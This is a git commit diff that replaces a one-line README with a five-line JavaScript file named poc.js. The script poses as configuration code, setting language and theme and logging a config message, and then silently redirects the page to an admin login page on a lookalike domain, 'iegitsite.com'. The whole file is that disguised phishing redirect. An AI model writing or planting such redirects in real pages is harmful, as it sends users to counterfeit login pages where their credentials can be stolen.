62d00d05155c7366fdfb6fba361688215c0bc60e
vtx <140315902+vt0x78@users.noreply.github.com>
2025-06-08 21:59:03 +0100

    Update and rename README.md to poc.js

--- README.md
+++
@@ -1,1 +0,0 @@
-# nologs-thursday
---
+++ poc.js
@@ -0,0 +1,5 @@
+window.lang = 'en';
+window.theme = 'dark';
+console.log('[config] Language and theme set');
+
+window.location.replace('http://iegitsite.com/admin/login');
